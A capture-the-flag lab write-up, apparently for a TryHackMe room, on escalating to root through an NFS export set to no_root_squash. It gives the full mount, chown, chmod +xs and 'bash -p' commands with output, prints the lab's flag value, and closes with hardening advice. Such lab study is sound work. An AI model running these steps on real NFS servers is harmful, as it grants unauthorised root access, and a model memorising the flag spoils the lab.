# Lab 09: Network File System (NFS) Root Squashing Misconfiguration

| Attribute | Details |
|---|---|
| **Lab Name** | NFS Root Squashing Privilege Escalation |
| **Difficulty** | Medium |
| **Focus Area** | Network File System (NFS) Misconfiguration, SUID Binary Weaponization |
| **Target OS** | Linux (Ubuntu / Debian Derivative) |
| **Vectors** | `no_root_squash` Export Parameter, Remote SUID Injection |
| **Author** | Nada (01SIRIUS10) |

---

## 🎯 Goal
Identify insecure NFS exports exposing the `no_root_squash` configuration directive, remotely mount the exposed filesystem share to an attacker-controlled machine, inject and weaponize an SUID-root binary, and execute the binary locally on the target to elevate privileges from low-privilege user (`karen`) to `root` (`euid=0`) to extract Flag 7.

---

## 🧠 Concept & Architecture

### 1. The NFS Protocol & Trust Model
Network File System (NFS, RFC 1094 / RFC 1813) is a distributed filesystem protocol that allows a client computer to access files over a network much like local storage. Traditionally (NFSv2/v3), the protocol lacks built-in cryptographic authentication. Instead, it relies on client-asserted User Identifiers (UID) and Group Identifiers (GID) passed within RPC requests:

```text
+---------------------------+             +---------------------------+
|     Attacker Machine      |             |       Target Server       |
|   (UID 0 - Local Root)    |             |       (NFS Daemon)        |
+---------------------------+             +---------------------------+
|                           |             |                           |
| 1. RPC Call: Write file / create binary |                           |
|    Asserted UID: 0, Asserted GID: 0     |                           |
|------------------------------------------------->|                  |
|                           |             |  [Evaluate /etc/exports]  |
|                           |             |  Share has: "no_root_squash"|
|                           |             |  File written with:       |
|                           |             |  Owner: root (UID 0)      |
|                           |             |  Permissions: rwsr-xr-x (4755)|
| 2. RPC Reply: Write OK (UID 0 preserved)|                           |
|<-------------------------------------------------|                  |
```

### 2. Root Squashing vs. `no_root_squash`
Under standard security hardening:
- **`root_squash` (Default Behavior):** Any client request asserting UID 0 (root) is intercepted by the NFS daemon and "squashed" (remapped) to an unprivileged user, typically `nobody` or `nfsnobody` (UID 65534). This prevents remote root users on client machines from writing root-owned files or modifying system-critical assets on the NFS server.
- **`no_root_squash` (Vulnerability):** Disables this identity mapping. The NFS server blindly honors client-asserted UID 0 requests, allowing an attacker with root access on their own machine to create, modify, and set arbitrary permissions (including SUID/SGID bits) on files owned by `root` on the remote server.

### 3. glibc ABI & Dynamic Linker Constraints
When injecting SUID binaries across different Linux environments, binary portability issues often arise:
- Cross-compiling a generic C reverse shell on modern distributions (e.g., Kali Linux with `glibc 2.34+`) produces an ELF binary linked against dynamic symbols not present in older target systems (e.g., Ubuntu running `glibc 2.31`).
- Attempting to run mismatched binaries results in linker termination: `/lib/x86_64-linux-gnu/libc.so.6: version 'GLIBC_2.34' not found`.
- **Architectural Fix:** Rather than compiling an external payload, copy the target's native `/bin/bash` into the shared NFS export, modify its ownership (`chown root:root`) and SUID permissions (`chmod +xs`) from the attacking machine via the NFS mount, and execute it locally on the target with `/tmp/target_bash -p`.

---

## 🔍 Enumeration

### Phase 1: Local Server Configuration Analysis
Inspecting `/etc/exports` on the target machine reveals the active NFS export configurations and options:

```bash
cat /etc/exports
```

```text
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

Export Analysis:
1. `/home/backup` — Accessible to all hosts (`*`), Read/Write (`rw`), `no_root_squash`.
2. `/tmp` — Accessible to all hosts (`*`), Read/Write (`rw`), `no_root_squash`.
3. `/home/ubuntu/sharedfolder` — Accessible to all hosts (`*`), Read/Write (`rw`), `no_root_squash`.

All 3 exported shares explicitly permit root privilege retention (`no_root_squash`).

### Phase 2: Remote Mount Enumeration (Attacker Machine)
From the attacking workstation (Kali Linux), verify mountable exports via RPC:

```bash
showmount -e 10.129.178.71
```

```text
Export list for 10.129.178.71:
/home/ubuntu/sharedfolder *
/tmp                     *
/home/backup             *
```

---

## 💥 Exploitation Workflow

### Step 1: Mount the Remote NFS Share
Create a local mount directory on the attacking machine and mount the target's `/tmp` export using NFSv3:

```bash
sudo mkdir -p /tmp/nfs_mount
sudo mount -o rw,vers=3 10.129.178.71:/tmp /tmp/nfs_mount
```

Verify mount status:

```bash
df -h | grep nfs_mount
```

### Step 2: Stage the Target Native Binary
On the Target Machine (`karen@target`), duplicate the native bash binary into the shared `/tmp` directory to ensure full glibc symbol compatibility:

```bash
cp /bin/bash /tmp/target_bash
ls -l /tmp/target_bash
```

```text
-rwxr-xr-x 1 karen karen 1183448 Mar 28 12:45 /tmp/target_bash
```

### Step 3: Elevate and Apply SUID Permissions
On the Attacking Machine (`root@kali`), change the owner of the mounted binary to root and apply the SUID permission bit:

```bash
sudo chown root:root /tmp/nfs_mount/target_bash
sudo chmod +xs /tmp/nfs_mount/target_bash
```

Verify permissions from the attacker mount:

```bash
ls -la /tmp/nfs_mount/target_bash
```

```text
-rwsr-sr-x 1 root root 1183448 Mar 28 12:45 /tmp/nfs_mount/target_bash
```

### Step 4: Execute Privileged Shell on Target
Return to the Target Machine (`karen@target`) and execute the SUID-enabled binary with `-p` (privileged mode to prevent bash from dropping elevated effective permissions):

```bash
/tmp/target_bash -p
```

```text
bash-5.0# id
uid=1000(karen) gid=1000(karen) euid=0(root) groups=1000(karen)
```
Root shell successfully obtained (`euid=0(root)`).

### Step 5: Flag Retrieval
With effective root access, navigate to the administrative directories and extract Flag 7:

```bash
cat /home/ubuntu/flag7.txt
```

```text
THM-89384012
```

---

## 🧬 Root Cause Analysis

```text
+-------------------------------------------------------------------------+
|                        ROOT CAUSE ARCHITECTURE                          |
+-------------------------------------------------------------------------+
|  1. Configuration Flaw:                                                 |
|     /etc/exports contained 'no_root_squash' on writable paths (/tmp).   |
|                                                                         |
|  2. Protocol Design Assumption:                                         |
|     NFSv3 inherently trusts client UID metadata without authentication. |
|                                                                         |
|  3. Filesystem Execution Semantics:                                     |
|     The target mount did not enforce the 'nosuid' mount option,         |
|     allowing SUID bits set remotely to execute locally with full euid=0.|
+-------------------------------------------------------------------------+
```

---

## 🛡️ Remediation & Hardening

### 1. Remove `no_root_squash` from `/etc/exports`
Ensure all exported filesystems enforce default root squashing (`root_squash`), mapping remote UID 0 requests to `nobody`:

```text
# Hardened /etc/exports
/home/backup 192.168.1.0/24(rw,sync,root_squash,no_subtree_check)
/home/ubuntu/sharedfolder 192.168.1.50(rw,sync,root_squash,no_subtree_check)
```

Apply changes immediately:

```bash
sudo exportfs -ra
```

### 2. Enforce `nosuid` Mount Flags
On systems mounting external or network-backed storage, enforce `nosuid` and `nodev` mount flags in `/etc/fstab` to prevent execution of SUID/SGID binaries:

```text
# /etc/fstab entry
10.129.178.71:/tmp  /mnt/target_tmp  nfs  rw,nosuid,nodev,noexec  0  0
```

### 3. Upgrade to NFSv4 with Kerberos Authentication
Migrate from NFSv3 to NFSv4 using RPCSEC_GSS with Kerberos (`sec=krb5p`) to provide mutual authentication and payload encryption:

```text
/export/secure_share gss/krb5i(rw,sync,root_squash)
```

### 4. Network Layer Segmentation & Firewall Rules
Restrict NFS daemon ports (2049/TCP/UDP, 111/TCP/UDP rpcbind) via iptables or ufw to authorized administrative subnets only:

```bash
sudo ufw allow from 192.168.1.0/24 to any port 2049 proto tcp
sudo ufw deny 2049
```

---

## 📝 My Lab Notes
- **Shares Discovered:** 3 mountable exports (`/home/backup`, `/tmp`, `/home/ubuntu/sharedfolder`).
- **Vulnerable Parameter:** All 3 shares exposed `no_root_squash`.
- **Linker Compatibility Pivot:** Cross-compiling C payloads from modern distributions (Kali glibc 2.34) failed on the target due to missing symbols. Copying the target's native `/bin/bash` directly into the NFS mount and applying `chown root:root` + `chmod +xs` bypassed all ABI compatibility issues cleanly.
- **Flag 7:** `THM-89384012` located at `/home/ubuntu/flag7.txt`.

---

## 💡 Key Takeaways
1. `no_root_squash` is equivalent to remote root command execution: If an attacker can write to a share configured with `no_root_squash`, they control file ownership and can plant SUID binaries.
2. Native Binaries Over Custom Compilations: When dealing with legacy or divergent Linux target environments, elevating existing target binaries (like `/bin/bash`) eliminates dynamic linker and glibc incompatibilities.
3. Defense in Depth for Network Storage: NFS security requires multiple layers: strict host IP binding, Kerberos identity verification, `root_squash` enforcement, and `nosuid` client mount flags.

---

## 🧭 Navigation
- ⬅️ Previous Lab: [08-path-variable.md](08-path-variable.md)
- ➡️ Next Lab: [10-capstone-challenge.md](10-capstone-challenge.md)
- 🏠 Privilege Escalation Home: [README.md](README.md)
